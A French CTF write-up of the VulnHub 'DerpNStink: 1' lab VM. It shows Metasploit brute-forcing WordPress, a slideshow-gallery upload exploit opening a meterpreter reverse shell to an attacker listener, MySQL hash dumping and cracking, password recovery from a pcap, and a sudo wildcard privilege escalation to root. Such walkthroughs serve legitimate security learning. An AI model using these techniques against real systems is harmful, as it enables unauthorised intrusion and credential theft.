# Solution du CTF DerpNStink: 1 de VulnHub

Le CTF *DerpNStink: 1* a été créé par [securekomodo](https://twitter.com/securekomodo) et est [disponible sur VulnHub](https://www.vulnhub.com/entry/derpnstink-1,221/).  

La particularité c'est que l'auteur a annoncé offrir [un petit bounty](https://twitter.com/securekomodo/status/971078228252200961) au premier qui résoudrait ce boot2root, ce qui vaut bien la peine de mettre [le Brainpan 3](https://www.vulnhub.com/entry/brainpan-3,121/) en pause :) (qui sera une autre paire de manches...)  

Au final pas eu trop de bol sur ce CTF ce qui m'a pris plus de temps qu'il aurait du, tant pis.  

Lamba: scan
-----------

```plain
Nmap scan report for 192.168.2.2
Host is up (0.0022s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|_  256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-title: DeRPnStiNK
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=6.47%I=7%D=3/7%Time=5AA0027E%P=x86_64-suse-linux-gnu%r(NUL
SF:L,2B,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\.8\r\n");
MAC Address: 08:00:27:6A:AA:B4 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14
Network Distance: 1 hop
Service Info: OS: Unix
```

Ce CTF consiste à récupérer 4 flags et devenir root sur le système.  

Pour peu que l'on sache scroller, on trouve le premier flag dans le code HTML de la page d'index : **flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)**  

Avec un buster on trouve des dossiers supplémentaires dont ceux indiqués dans le *robots.txt* :  

```plain
Starting buster processes...
http://192.168.2.2/css/ - HTTP 403 (282 bytes, plain)
http://192.168.2.2/icons/ - HTTP 403 (284 bytes, plain)
http://192.168.2.2/javascript/ - HTTP 403 (289 bytes, plain)
http://192.168.2.2/php/ - HTTP 403 (282 bytes, plain)
http://192.168.2.2/server-status/ - HTTP 403 (292 bytes, plain)
http://192.168.2.2/temporary/ - HTTP 200 (12 bytes, plain)
100% - DONE
```

Le dossier *temporay* nous indique juste *try harder*.  

On trouve (via buster aussi) un fichier */php/info.php* vide et une install de phpmyAdmin à */php/phpmyadmin/*.  

Dans la page d'index j'avais aussi remarqué une référence à une ressource *webnotes/info.txt* qui contient le message suivant :  

```plain
@stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live
```

La racine du dossier *webnotes* retourne le résultat d'un whois bidon qui nous incite à rajouter une entrée *derpnstink.local* dans notre */etc/hosts*.  

C'est aussi une indication qu'un utilisateur *stinky* est présent sur le système.  

Finalement avec un autre buster et une autre wordlist je trouve un Wordpress à l'URL */weblog*.  

Ce dernier a une balise plutôt parlante :  

```html
<meta name="generator" content="WordPress 4.6.9" />
```

D'après [le site officiel de Wordpress](https://codex.wordpress.org/Version_4.6.9), cette version a été sortie fin novembre 2017.  

Trustno1
--------

Dans le code HTML du blog on trouve quelques références étranges :  

```html
<ul id="slideshowcustom" class="slideshowcustom" style="display:none;">
    <!-- From all slides or gallery slides -->

    <li>
        <h3 style="opacity:70;">Slideshow</h3>
        <span>http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/derp.png</span>
        <p></p>
        <a></a>
    </li>

    <li>
        <h3 style="opacity:70;">h0m3l4b1t</h3>
        <span>http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php</span>
        <p>h0m3l4b1t</p>
        <a></a>
        </li>

    <li>
        <h3 style="opacity:70;">h0m3l4b1t</h3>
        <span>http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php</span>
        <p>h0m3l4b1t</p>
        <a></a>
        </li>

    <li>
        <h3 style="opacity:70;">randonx</h3>
        <span>http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/elidumfy.php</span>
        <p>randonx</p>
        <a></a>
        </li>

    <li>
        <h3 style="opacity:70;">randonx</h3>
        <span>http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/uoukbgmr.php</span>
        <p>randonx</p>
        <a></a>
        </li>
</ul>
```

Si on cherche via un DuckDuckGo ou Google on voit que *h0m3l4b1t* fait référence à un exploit shellshock et *randonx* à l'exploit *wp\_slideshowgallery\_upload* de *Metasploit*.  

Au passage le fichier *elidumfy.php* est bien présent sur le système et [semble avoir été généré par *Metasploit*](https://hydrasky.com/network-security/create-a-web-backdoor-payload-with-metasploit/) (présence des caractères */\**) mais l'appeler n'a aucun effet (pas de paquets générés donc pas de reverse shell ni de bind de ports d'ailleurs).  

J'ai ensuite eu recours à *wpscan* pour avoir plus d'infos sur le Wordpress :  

```plain
[+] Name: slideshow-gallery - v1.4.6
 |  Last updated: 2017-07-17T09:36:00.000Z
 |  Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 |  Readme: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
[!] The version is out of date, the latest version is 1.6.7.1

[!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
    Reference: https://wpvulndb.com/vulnerabilities/7532
    Reference: http://seclists.org/bugtraq/2014/Sep/1
    Reference: http://packetstormsecurity.com/files/131526/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
    Reference: https://www.exploit-db.com/exploits/34681/
    Reference: https://www.exploit-db.com/exploits/34514/
[i] Fixed in: 1.4.7

[!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS) 
    Reference: https://wpvulndb.com/vulnerabilities/8263
    Reference: http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html
    Reference: http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html
[i] Fixed in: 1.5.3.4

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+-------------+---------------------------------+
    | Id | Login       | Name                            |
    +----+-------------+---------------------------------+
    | 1  | unclestinky | 404 Not                         |
    | 2  | admin       | admin – DeRPnStiNK Professional |
    +----+-------------+---------------------------------+
```

Ne trouvant rien de plus (l'exploit pour *slideshow-gallery* nécessite un compte sur le wordpress) j'ai tenté de brute-forcer les deux comptes avec des wordlists de plus en plus grosses, sans résultat, en me servant de la fonction de brute-force de *wpscan*.  

J'ai aussi tenté de casser les comptes FTP avec *Hydra*... nope.  

Au boût d'un moment j'ai rebooté la VM et cette fois la base de données était cassée, le Wordpress renvoyait une erreur...  

J'ai donc re-importé la VM et tenté de casser les comptes Wordpress, cette fois avec *Metasploit* qui n'en a fait qu'une bouchée :  

```plain
msf auxiliary(wordpress_login_enum) > exploit

[*] /weblog/ - WordPress Version 4.6.9 detected
[*] /weblog/ - WordPress User-Enumeration - Running User Enumeration
[+] /weblog/ - Found user 'unclestinky' with id 1
[*] /weblog/ - Usernames stored in: /root/.msf4/loot/20180311120114_default_192.168.2.3_wordpress.users_558758.txt
[*] /weblog/ - WordPress User-Validation - Running User Validation
[*] /weblog/ - WordPress User-Validation - Checking Username:'admin'
[+] /weblog/ - WordPress User-Validation - Username: 'admin' - is VALID
[+] /weblog/ - WordPress User-Validation - Found 1 valid user
[*] /weblog/ - WordPress Brute Force - Running Bruteforce
[*] /weblog/ - WordPress Brute Force - Skipping all but 1 valid user
[*] /weblog/ - WordPress Brute Force - Trying username:'admin' with password:'admin'
[+] /weblog/ - WordPress Brute Force - SUCCESSFUL login for 'admin' : 'admin'
[*] /weblog/ - Brute-forcing previously found accounts...
[*] /weblog/ - WordPress Brute Force - Trying username:'unclestinky' with password:''
[-] /weblog/ - WordPress Brute Force - Failed to login as 'unclestinky'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

J'ai décidé de retenter ensuite avec *wpscan*... rien ! Comme quoi il ne faut jamais apporter trop de confiance aux outils qu'on utilise :p   

```plain
msf exploit(wp_slideshowgallery_upload) > show options

Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST        192.168.2.3       yes       The target address
   RPORT        80                yes       The target port
   SSL          false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /weblog/          yes       The base path to the wordpress application
   VHOST        derpnstink.local  no        HTTP server virtual host
   WP_PASSWORD  admin             yes       Valid password for the provided username
   WP_USER      admin             yes       A valid username

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.240    yes       The listen address
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6

msf exploit(wp_slideshowgallery_upload) > exploit

[*] Started reverse TCP handler on 192.168.2.240:4444 
[*] Trying to login as admin
[*] Trying to upload payload
[*] Uploading payload
[*] Calling uploaded file xfgkwjpm.php
[*] Sending stage (33684 bytes) to 192.168.2.3
[*] Meterpreter session 1 opened (192.168.2.240:4444 -> 192.168.2.3:57984) at 2018-03-11 12:05:43 +0100
[+] Deleted xfgkwjpm.php
meterpreter > ls
Listing: /var/www/html/weblog/wp-content/uploads/slideshow-gallery
==================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   4096    dir   2017-11-13 04:43:29 +0100  cache
100644/rw-r--r--  108987  fil   2017-11-13 04:45:12 +0100  derp.png
100644/rw-r--r--  1114    fil   2017-12-12 22:44:11 +0100  elidumfy.php
```

Password reuse
--------------

Une fois le shell récupéré on peut lire les identifiants SQL dans le wp-config :  

```php
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Ce qui permet de dumper les hashs des utilisateurs MySQL :  

```plain
mysql> select User, Password from user;
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| debian-sys-maint | *B95758C76129F85E0D68CF79F38B66F156804E93 |
| unclestinky      | *9B776AFB479B31E8047026F1185E952DD1E530CB |
| phpmyadmin       | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 |
+------------------+-------------------------------------------+
7 rows in set (0.00 sec)
```

Avec hashcat on obtient les passwords pour *phpmyadmin* et surtout *unclestinky* (il faut retirer les astérisques dans le fichier des hashs) :  

```plain
$ hashcat-cli64.bin -a 0 -m 300 hash.txt rockyou.txt
4acfe3202a5ff5cf467898fc58aab1d615029441:admin
9b776afb479b31e8047026f1185e952dd1e530cb:wedgie57
```

On peut aussi passer par le phpMyAdmin avec les identifiants root, c'est plus agréable pour explorer et ainsi trouver le second flag dans les drafts (brouillons) du Wordpress :  

```plain
flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
```

On pourrait aussi sans doute le voir directement depuis Wordpress mais il fallait sans doute jouer sur les paramètres d'affichage de la section admin.  

Le mot de passe *wedgie57* ne permet pas l'accès en SSH car il y a une configuration par clé uniquement mais on peut faire un su depuis notre session *Meterpreter*.

A l'écoute
----------

Dans le dossier personnel de l'utilisateur stinky on retrouve plusieurs fichiers d'intérêt :  

```plain
.local/share/keyrings/login.keyring
.local/share/keyrings/user.keystore
.local/share/telepathy/mission-control/accounts.cfg
Desktop/flag.txt
Documents/derpissues.pcap
ftp/files/test.txt
ftp/files/network-logs/derpissues.txt
ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/key.txt
```

Le dernier fichier est la clé privée SSH de stinky.  

Le flag est le suivant : **flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)**.  

Quand au contenu de *derpissues.txt* :  

```plain
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

Cette discussion nous permet de comprendre la présence du fichier *Documents/derpissues.pcap*.  

L'avantage c'est que l'on sait ce que l'on recherche (une requête HTTP POST sur le port 80) c'est donc assez facile de s'y retrouver avec le bon filtre dans Wireshark.  

![DerpNStink CTF Wireshark Wordpress password](https://raw.githubusercontent.com/devl00p/blog/master/images/derpnstink_derp_password.png)

Ainsi on peut passer de *stinky* à *mrderp* via la commande su et le mot de passe *derpderpderpderpderpderpderp*.  

Wildcards in command line arguments should be used with care (man sudoers(5))
-----------------------------------------------------------------------------

Et pas que dans les arguments !  

*mrderp* dispose de plusieurs fichiers intéressants sur le système. L'un est */support/troubleshooting.txt* dont voici le contenu :  

```plain
*******************************************************************
On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.

However i dont want to specify each command to allow

How can I exclude these commands from password protection to sudo?

********************************************************************

********************************************************************
Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket. 

Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.

Thank you for using our product.

********************************************************************
```

et l'autre *Desktop/helpdesk.log* dans son dossier personnel :  

```plain
From: Help Desk <helpdesk@derpnstink.local>
Date: Thu, Aug 23, 2017 at 1:29 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.

Help Desk Ticket Notification
Thank you for contacting the Help Desk. Your ticket information is below. If you have any
additional information to add to this ticket, please reply to this notification.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us. Note that the Help Desk's busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).

Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: Sudoers File issues
Ticket Number: 242
Status: Break/fix
Date Created: 08/23/2017
Latest Update Date: 08/23/2017
Contact Name: Mr Derp
CC’s: Uncle Stinky
Full description and latest notes on your Ticket: Sudoers File issues
Notification

Regards,
Service Desk

Listen with focus, answer with accuracy, assist with compassion.

From: Help Desk
Date: Mon, Sep 10, 2017 at 2:53 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.

Closed Ticket Notification

Thank you for contacting the Help Desk. Your ticket information and its resolution is
below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
assistance, please reply to this notification to provide additional information.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us or visit our Self Help Web page at https://pastebin.com/RzK9WfGw 
Note that the Help Desk's busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).
Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: sudoers issues
Ticket Number: 242
Status: Closed
Date Created: 09/10/2017
Latest Update Date: 09/10/2017
CC’s:
Resolution: Closing ticket. ticket notification.

Regards,
eRA Service Desk
Listen with focus, answer with accuracy, assist with compassion.
For more information, dont forget to visit the Self Help Web page!!!
```

Pour l'attardé mental au fond de la classe ça veut dire qu'on doit faire un *sudo -l* pour voir ce qu'on est autorisé à lancer :  

```plain
User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

Obtenir le root est aisé :  

```plain
mrderp@DeRPnStiNK:~$ cp /bin/bash /home/mrderp/binaries/derpybash
mrderp@DeRPnStiNK:~$ sudo /home/mrderp/binaries/derpybash -p
root@DeRPnStiNK:~# id
uid=0(root) gid=0(root) groups=0(root)
```

et le dernier flag :  

```plain
root@DeRPnStiNK:/root# cat Desktop/flag.txt 
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo
```

Parcours de santé
-----------------

Le CTF était simple malheureusement le fait que *wpscan* soit incapable de bruteforcer correctement les accounts m'a fait perdre beaucoup de temps :-(   

Pour info le fichier *elidumfy.php* présent était bien un reverse shell qui tenter de se connecter sur 192.168.3.139:4444. La VM ne voyant pas de route pour cette adresse, le script échouait sans générer le moindre paquet.  

Si l'auteur avait laissé une indication sur cette configuration réseau le fichier aurait pu alors être réutilisé.  


*Published March 14 2018 at 12:01*